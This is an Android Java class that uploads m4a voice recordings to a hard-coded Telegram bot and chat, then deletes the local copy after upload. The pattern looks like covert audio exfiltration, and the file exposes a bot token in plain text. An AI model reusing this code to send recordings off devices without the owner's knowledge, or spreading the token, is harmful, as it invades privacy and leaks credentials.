package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";
    private static final String TELEGRAM_API = "https://api.telegram.org";
    private static final String BOT_TOKEN = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
    private static final String CHAT_ID = "-1004352035353";
    
    private OkHttpClient httpClient;
    
    public TelegramUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build();
    }
    
    public boolean uploadAudio(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "❌ فایل وجود ندارد");
                return false;
            }
            
            Log.d(TAG, "========================================");
            Log.d(TAG, "📤 ارسال مستقیم به تلگرام");
            Log.d(TAG, "📁 فایل: " + file.getName());
            Log.d(TAG, "📏 حجم: " + file.length() / 1024 + " KB");
            Log.d(TAG, "📝 کپشن: " + caption);
            Log.d(TAG, "========================================");
            
            RequestBody fileBody = RequestBody.create(
                file,
                MediaType.parse("audio/m4a")
            );
            
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("voice", file.getName(), fileBody)
                .addFormDataPart("caption", caption != null ? caption : "🎙️ تست ۱ دقیقه")
                .build();
            
            String url = TELEGRAM_API + "/bot" + BOT_TOKEN + "/sendVoice";
            Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
            
            Log.d(TAG, "⏳ ارسال...");
            long startTime = System.currentTimeMillis();
            
            Response response = httpClient.newCall(request).execute();
            String responseBody = response.body() != null ? response.body().string() : "";
            
            long elapsed = System.currentTimeMillis() - startTime;
            Log.d(TAG, "⏱️ زمان ارسال: " + elapsed/1000 + " ثانیه");
            
            Log.d(TAG, "📥 کد پاسخ: " + response.code());
            Log.d(TAG, "📥 پاسخ: " + responseBody);
            
            boolean success = response.isSuccessful();
            response.close();
            
            if (success) {
                Log.d(TAG, "✅ ارسال موفق!");
                file.delete();
            } else {
                Log.e(TAG, "❌ ارسال ناموفق");
            }
            
            Log.d(TAG, "========================================");
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "❌ خطا", e);
            return false;
        }
    }
}
